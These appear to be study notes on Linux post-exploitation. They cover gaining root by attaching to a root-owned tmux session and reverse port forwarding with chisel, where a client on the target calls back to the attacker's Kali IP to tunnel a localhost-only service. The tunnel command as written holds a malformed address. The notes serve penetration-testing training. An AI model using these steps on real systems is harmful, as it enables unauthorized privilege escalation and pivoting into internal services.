**Process Hijacking**

If any process is running in the background whose owner is root, we can take its advantage to privilege escalations.

***ps aux*** >> to check all the processes running in the background

<img width="720" height="267" alt="image" src="https://github.com/user-attachments/assets/c86ff359-8da7-493a-81c7-4e5929ba88dc" />

tumx is a type of shell. tmux shell is running on the background. If we bring this shell in the foreground, we will get root shell.

copy all the command and hit enter.

<img width="720" height="133" alt="image" src="https://github.com/user-attachments/assets/57262346-8b29-42e6-bfbb-8941bbcb56e1" />

<img width="720" height="165" alt="image" src="https://github.com/user-attachments/assets/39f49bbe-77fc-4d9d-8e2b-909828ea4197" />

And we will get shell of root user.

==================================================================================

**Port Forwarding**

Any port that is open locally 127.0.0.1 and we want our machine to access it, it can be done via port forwarding.

We can forward a port and make it secure by tunneling. When we perform tunneling, that data got encrypted. So port forwarding is making a way to access port that is locally hosted and by tunneling we are securing it.

How to check which ports are opened only for the target machine that cannot be detected by nmap

***netstat -plant***

<img width="720" height="309" alt="image" src="https://github.com/user-attachments/assets/b6bcf879-4a60-4b1e-8bac-1072a9ecf00b" />

All 0.0.0.0 ports are open for all external and internal (localhost) users.

We need to focus on 127.0.0.1 IP and Ports which are opened for localhost.

There are two ports 127.0.0.1:6666 and 127.0.0.53:53. Port 53 is for DNS so we can ignore it.

Need to check what is running on port 6666.

***curl http://127.0.0.1:6666***

<img width="720" height="305" alt="image" src="https://github.com/user-attachments/assets/937d59c5-287e-4acd-bd62-73293f0afe12" />

We got some source code. It means some website is running on localhost.

As this port 6666 is not available for external user, we need to forward this port 6666 so that our Kali machine can access this port as well.

There are multiple tools for port forwarding. We will use a tool called chisel

https://github.com/jpillora/chisel

<img width="720" height="108" alt="image" src="https://github.com/user-attachments/assets/28e3a3bf-baef-4cf5-9915-03b7961d3c09" />

We have downloaded the file and unzip it.

<img width="720" height="139" alt="image" src="https://github.com/user-attachments/assets/8d66a3d3-159e-4768-a11a-83be00d66062" />

chmod: Change file permissions.

+x: Add the execute permission.

./chisel: The target file in the current directory.

Now we need to transfer chisel to the target machine as well.

<img width="720" height="102" alt="image" src="https://github.com/user-attachments/assets/dc0a8b0a-2cae-4026-9e6a-787a302c39a2" />

On the target machine, we will user /tmp folder

<img width="720" height="288" alt="image" src="https://github.com/user-attachments/assets/c9b85cf6-5f0e-4145-8caa-53ba25d9bbcd" />

<img width="621" height="180" alt="image" src="https://github.com/user-attachments/assets/6cee07ee-6ace-4398-803c-9cda447cd226" />

Now, in chisel we need to make client and server. Our kali machine will be server and target machine we will be client.

Server (Kali machine) will listen, and client (target machine) will make connection to it.

***./chisel server — reverse -p 9001***

<img width="720" height="142" alt="image" src="https://github.com/user-attachments/assets/98c31a67-83e3-4af9-9659-09b9c8e3b5bd" />

Server has started listening

— reverse means the connection will come from client to server.

9001 is a recommended random port. We can use any other port as well.

On target machine,

***./chisel client 10.17.66.176:9001 R:3333:127:0.0.1:6666***

10.17.66.176 is the server IP (Kali machine)

R means its a revere tunneling. Client will initiate the traffic towards server.

3333 is any random port on server to which port 6666 of 127.0.0.1 will be forwarded.

<img width="720" height="83" alt="image" src="https://github.com/user-attachments/assets/d070a3d1-dff5-4f28-a79c-b3c5c6eae734" />

Connection is established.

On server

<img width="720" height="128" alt="image" src="https://github.com/user-attachments/assets/767f731f-e943-4e8c-a1bc-0146b7b43afb" />

Connection is established. So any traffic on port 3333 of server will be redirected to port 6666 of client.

Now on out kali machine,

<img width="720" height="403" alt="image" src="https://github.com/user-attachments/assets/dba99626-afb5-48bb-b200-73f9ff234a58" />

Here we are opening localhost (kali machine) port 3333.

As port 3333 is redirecting to port 6666 of client, we got the output.

<img width="720" height="235" alt="image" src="https://github.com/user-attachments/assets/9a730fd6-b893-4bd6-9105-55be87e0562e" />




